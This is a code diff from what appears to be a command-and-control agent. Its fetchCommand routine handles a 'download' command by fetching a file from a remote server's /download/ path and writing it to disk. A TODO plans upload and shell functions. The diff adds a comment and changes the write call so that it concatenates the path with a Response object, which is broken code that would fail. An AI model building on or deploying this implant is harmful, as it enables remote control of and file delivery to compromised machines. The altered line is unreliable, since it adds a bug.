@@ -102,12 +102,13 @@ def fetchCommand(ip):
         # TODO: Add upload/download/shell related functionality of the agent here 
         if "download" == command.split(' ')[0]:
             try:
+                # The destination path might be a problem if the path has space in between. ex) C:\Program Files\ ... 
                 filename = command.split(' ')[1]
                 destination_path = command.split(' ')[2]
 
                 download_url = URL + '/download/' + filename
                 myFile = requests.get(download_url)
-                open(destination_path,'wb').write(myFile.content)
+                open(destination_path+myFile,'wb').write(myFile.content)
 
             except Exception as e:
                 return "[DEBUG] File Download Failed." + str(e) 
